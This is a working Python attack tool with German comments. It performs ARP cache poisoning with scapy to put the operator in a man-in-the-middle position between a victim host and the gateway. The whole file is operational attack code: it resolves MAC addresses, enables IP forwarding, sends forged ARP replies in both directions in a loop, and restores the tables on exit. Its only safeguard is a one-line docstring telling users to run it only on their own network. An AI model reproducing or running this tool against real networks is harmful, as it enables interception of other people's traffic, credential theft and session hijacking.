#!/usr/bin/env python3
"""
ARP Spoofer - Man-in-the-Middle via ARP Cache Poisoning.
Ermöglicht das Abfangen von Traffic zwischen zwei Hosts im LAN.
Erfordert root-Rechte. NUR im eigenen Netzwerk verwenden!
"""

import sys
import os
import time
import signal
import argparse
import subprocess

try:
    from scapy.all import Ether, ARP, sendp, srp, get_if_hwaddr, conf
    conf.verb = 0
except ImportError:
    print("[!] Scapy nicht installiert: pip install scapy")
    sys.exit(1)


def get_mac(ip, interface, retries=3):
    """Ermittelt die MAC-Adresse über ARP-Request."""
    for _ in range(retries):
        pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
        result = srp(pkt, iface=interface, timeout=2, verbose=0)[0]
        if result:
            return result[0][1][ARP].hwsrc
    return None


def enable_ip_forwarding():
    """Aktiviert IP-Forwarding für MITM."""
    with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
        f.write("1")
    print("[+] IP-Forwarding aktiviert")


def disable_ip_forwarding():
    """Deaktiviert IP-Forwarding."""
    with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
        f.write("0")
    print("[+] IP-Forwarding deaktiviert")


def spoof(interface, target_ip, target_mac, spoof_ip):
    """Sendet gefälschtes ARP-Reply."""
    pkt = Ether(dst=target_mac) / ARP(
        op=2,  # ARP Reply
        pdst=target_ip,
        hwdst=target_mac,
        psrc=spoof_ip
    )
    sendp(pkt, iface=interface, verbose=0)


def restore(interface, target_ip, target_mac, source_ip, source_mac):
    """Stellt die originale ARP-Tabelle wieder her."""
    pkt = Ether(dst=target_mac) / ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=source_ip,
        hwsrc=source_mac
    )
    sendp(pkt, iface=interface, count=5, verbose=0)


def get_default_gateway():
    """Ermittelt das Standard-Gateway."""
    try:
        result = subprocess.run(["ip", "route"], capture_output=True, text=True)
        for line in result.stdout.split("\n"):
            if line.startswith("default"):
                return line.split()[2]
    except Exception:
        pass
    return None


def get_default_interface():
    """Ermittelt das Standard-Netzwerkinterface."""
    try:
        result = subprocess.run(["ip", "route"], capture_output=True, text=True)
        for line in result.stdout.split("\n"):
            if line.startswith("default"):
                parts = line.split()
                if "dev" in parts:
                    return parts[parts.index("dev") + 1]
    except Exception:
        pass
    return "eth0"


def run(args=None):
    parser = argparse.ArgumentParser(description="ARP Spoofer - MITM via ARP Cache Poisoning")
    parser.add_argument("-t", "--target", required=True, help="Ziel-IP (Opfer)")
    parser.add_argument("-g", "--gateway", help="Gateway-IP (Standard: Default Gateway)")
    parser.add_argument("-i", "--interface", help="Netzwerkinterface (Standard: auto)")
    parser.add_argument("--interval", type=float, default=2, help="Intervall zwischen Paketen in Sek. (Standard: 2)")
    parser.add_argument("--bidirectional", action="store_true", default=True,
                        help="Bidirektionales Spoofing (Standard: aktiviert)")

    args = parser.parse_args(args)

    if os.geteuid() != 0:
        print("[!] Root-Rechte erforderlich!")
        sys.exit(1)

    interface = args.interface or get_default_interface()
    gateway_ip = args.gateway or get_default_gateway()
    target_ip = args.target

    if not gateway_ip:
        print("[!] Kein Gateway gefunden. Bitte mit -g angeben.")
        sys.exit(1)

    print(f"\n{'═' * 50}")
    print(f"  ARP Spoofer")
    print(f"  Interface: {interface}")
    print(f"  Ziel:      {target_ip}")
    print(f"  Gateway:   {gateway_ip}")
    print(f"{'═' * 50}\n")

    # MAC-Adressen auflösen
    print("[*] Ermittle MAC-Adressen...")
    target_mac = get_mac(target_ip, interface)
    if not target_mac:
        print(f"[!] Kann MAC von {target_ip} nicht ermitteln. Host erreichbar?")
        sys.exit(1)
    print(f"    Ziel:    {target_ip} -> {target_mac}")

    gateway_mac = get_mac(gateway_ip, interface)
    if not gateway_mac:
        print(f"[!] Kann MAC von {gateway_ip} nicht ermitteln.")
        sys.exit(1)
    print(f"    Gateway: {gateway_ip} -> {gateway_mac}")

    # IP Forwarding aktivieren
    enable_ip_forwarding()

    packets_sent = 0
    print(f"\n[*] Starte ARP Spoofing... (Ctrl+C zum Stoppen)\n")

    try:
        while True:
            # Ziel: Gateway ist bei uns
            spoof(interface, target_ip, target_mac, gateway_ip)
            # Gateway: Ziel ist bei uns
            if args.bidirectional:
                spoof(interface, gateway_ip, gateway_mac, target_ip)
            packets_sent += 2 if args.bidirectional else 1
            print(f"\r[*] Pakete gesendet: {packets_sent}", end="", flush=True)
            time.sleep(args.interval)

    except KeyboardInterrupt:
        print(f"\n\n[*] Spoofing gestoppt. Stelle ARP-Tabellen wieder her...")
        restore(interface, target_ip, target_mac, gateway_ip, gateway_mac)
        restore(interface, gateway_ip, gateway_mac, target_ip, target_mac)
        disable_ip_forwarding()
        print(f"[+] ARP-Tabellen wiederhergestellt. {packets_sent} Pakete gesendet.")


if __name__ == "__main__":
    run()
